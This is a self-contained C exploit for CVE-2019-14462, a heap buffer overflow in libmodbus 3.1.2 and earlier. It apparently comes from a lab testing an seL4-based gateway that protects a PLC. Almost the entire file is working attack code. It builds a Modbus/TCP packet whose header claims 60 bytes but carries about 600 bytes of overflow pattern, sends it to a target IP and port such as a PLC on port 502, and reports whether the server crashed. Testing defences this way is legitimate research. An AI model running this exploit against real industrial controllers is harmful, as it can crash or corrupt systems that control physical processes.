/*
 * CVE-2019-14462 Exploit - Self-contained (no libmodbus dependency)
 *
 * This exploits the heap buffer overflow in libmodbus <= 3.1.2 where the
 * MBAP header length field is trusted without validation.
 *
 * Attack: Declare small length (60 bytes) but send large payload (600+ bytes)
 * Result: Server allocates 60-byte buffer, receives 600 bytes → heap overflow
 *
 * Compile: gcc -o cve_14462_attack cve_14462_attack.c
 * Usage:   ./cve_14462_attack <IP> <PORT>
 *
 * For educational/defensive security research only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

/* CVE-2019-14462 parameters */
#define DECLARED_LENGTH 60       /* MBAP header claims 60 bytes */
#define ACTUAL_PDU_LENGTH 600    /* Actually send 600 bytes */
#define MBAP_HEADER_SIZE 7
#define QUERY_SIZE (MBAP_HEADER_SIZE + ACTUAL_PDU_LENGTH)

/* Overflow marker pattern - easy to spot in memory dumps */
static const uint8_t MARKER[] = {0xDE, 0xAD, 0xBE, 0xEF};

static void print_usage(const char *prog) {
    printf("CVE-2019-14462 Exploit - Heap Buffer Overflow in libmodbus <= 3.1.2\n\n");
    printf("Usage: %s <IP> <PORT>\n\n", prog);
    printf("Examples:\n");
    printf("  %s 192.168.95.2 502      # Attack PLC directly\n", prog);
    printf("  %s 127.0.0.1 5020        # Attack via Docker bypass\n", prog);
    printf("  %s 127.0.0.1 502         # Attack via seL4 gateway (should be blocked)\n", prog);
}

static int tcp_connect(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid IP address: %s\n", ip);
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

static int send_all(int sock, const uint8_t *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t sent = send(sock, buf + total, len - total, 0);
        if (sent <= 0) {
            perror("send");
            return -1;
        }
        total += sent;
    }
    return 0;
}

static void build_exploit_packet(uint8_t *query) {
    memset(query, 0, QUERY_SIZE);

    /*
     * MBAP Header (7 bytes)
     * ┌─────────────────┬─────────────────┬─────────────────┬──────────┐
     * │ Transaction ID  │ Protocol ID     │ Length          │ Unit ID  │
     * │ (2 bytes)       │ (2 bytes)       │ (2 bytes)       │ (1 byte) │
     * └─────────────────┴─────────────────┴─────────────────┴──────────┘
     *                                       ↑
     *                                       THE BUG: We lie here!
     *                                       Claim 60 bytes, send 600
     */
    query[0] = 0x00;                            /* Transaction ID high */
    query[1] = 0x01;                            /* Transaction ID low */
    query[2] = 0x00;                            /* Protocol ID high (Modbus) */
    query[3] = 0x00;                            /* Protocol ID low */
    query[4] = (DECLARED_LENGTH >> 8) & 0xFF;   /* Length high - LIES! */
    query[5] = DECLARED_LENGTH & 0xFF;          /* Length low - LIES! */
    query[6] = 0x01;                            /* Unit ID */

    /*
     * PDU - Read Holding Registers request
     * (The actual function doesn't matter - overflow happens during receive)
     */
    query[7] = 0x03;    /* Function code: Read Holding Registers */
    query[8] = 0x00;    /* Start address high */
    query[9] = 0x00;    /* Start address low */
    query[10] = 0x00;   /* Quantity high */
    query[11] = 0x10;   /* Quantity low (16 registers) */

    /*
     * Overflow payload - fill with DEADBEEF marker pattern
     * This overwrites heap memory beyond the allocated buffer
     */
    for (size_t i = 12; i < QUERY_SIZE; i++) {
        query[i] = MARKER[(i - 12) % sizeof(MARKER)];
    }
}

static void print_packet_info(const uint8_t *query) {
    printf("\n");
    printf("┌──────────────────────────────────────┐\n");
    printf("│ CVE-2019-14462 Exploit Packet        │\n");
    printf("├──────────────────────────────────────┤\n");
    printf("│ MBAP Header:                         │\n");
    printf("│  Trans ID:  0x%02X%02X                  │\n", query[0], query[1]);
    printf("│  Protocol:  0x%02X%02X (Modbus)         │\n", query[2], query[3]);
    printf("│  Declared:  %d bytes ← LIES!        │\n", DECLARED_LENGTH);
    printf("│  Unit ID:   0x%02X                     │\n", query[6]);
    printf("├──────────────────────────────────────┤\n");
    printf("│ PDU:                                 │\n");
    printf("│  Func: 0x%02X (Read Holding Regs)     │\n", query[7]);
    printf("│  Addr: 0x%02X%02X                       │\n", query[8], query[9]);
    printf("│  Qty:  %d registers                  │\n", (query[10] << 8) | query[11]);
    printf("├──────────────────────────────────────┤\n");
    printf("│ Exploit:                             │\n");
    printf("│  Declared: %d bytes                 │\n", DECLARED_LENGTH);
    printf("│  Actual:   %d bytes                │\n", ACTUAL_PDU_LENGTH);
    printf("│  Overflow: %d bytes!               │\n", ACTUAL_PDU_LENGTH - DECLARED_LENGTH);
    printf("│  Pattern:  0xDEADBEEF               │\n");
    printf("└──────────────────────────────────────┘\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Invalid port: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    printf("╔══════════════════════════════════════╗\n");
    printf("║ CVE-2019-14462: Heap Overflow        ║\n");
    printf("║ Affects: libmodbus <= 3.1.2          ║\n");
    printf("╚══════════════════════════════════════╝\n");
    printf("\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Packet size: %d bytes (declared: %d)\n", QUERY_SIZE, DECLARED_LENGTH);

    /* Build exploit packet */
    uint8_t query[QUERY_SIZE];
    build_exploit_packet(query);
    print_packet_info(query);

    /* Connect to target */
    printf("[1] Connecting to target...\n");
    int sock = tcp_connect(target_ip, target_port);
    if (sock < 0) {
        return EXIT_FAILURE;
    }
    printf("    Connected!\n\n");

    /* Send exploit */
    printf("[2] Sending exploit packet (%d bytes)...\n", QUERY_SIZE);
    if (send_all(sock, query, QUERY_SIZE) < 0) {
        close(sock);
        return EXIT_FAILURE;
    }
    printf("    Sent!\n\n");

    /* Wait for response (or crash) */
    printf("[3] Waiting for response...\n");
    uint8_t response[260];
    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    ssize_t received = recv(sock, response, sizeof(response), 0);
    if (received < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            printf("    Timeout - server may have crashed!\n");
        } else {
            printf("    Connection error: %s\n", strerror(errno));
        }
    } else if (received == 0) {
        printf("    Connection closed by server - likely CRASHED!\n");
    } else {
        printf("    Received %zd bytes:\n    ", received);
        for (ssize_t i = 0; i < received && i < 32; i++) {
            printf("%02X ", response[i]);
        }
        if (received > 32) printf("...");
        printf("\n");
    }

    printf("\n");
    printf("╔══════════════════════════════════════╗\n");
    printf("║ RESULT                               ║\n");
    printf("╠══════════════════════════════════════╣\n");
    if (received <= 0) {
        printf("║ Server crashed/timeout!              ║\n");
        printf("║ Exploit likely succeeded.            ║\n");
        printf("║                                      ║\n");
        printf("║ Heap overflow corrupted memory.      ║\n");
        printf("║ Check logs or run with ASAN.         ║\n");
    } else {
        printf("║ Server responded normally.           ║\n");
        printf("║                                      ║\n");
        printf("║ Possible reasons:                    ║\n");
        printf("║ • Patched (libmodbus > 3.1.2)       ║\n");
        printf("║ • seL4 blocked malformed packet     ║\n");
        printf("║ • Other mitigations in place        ║\n");
    }
    printf("╚══════════════════════════════════════╝\n");

    close(sock);
    return EXIT_SUCCESS;
}
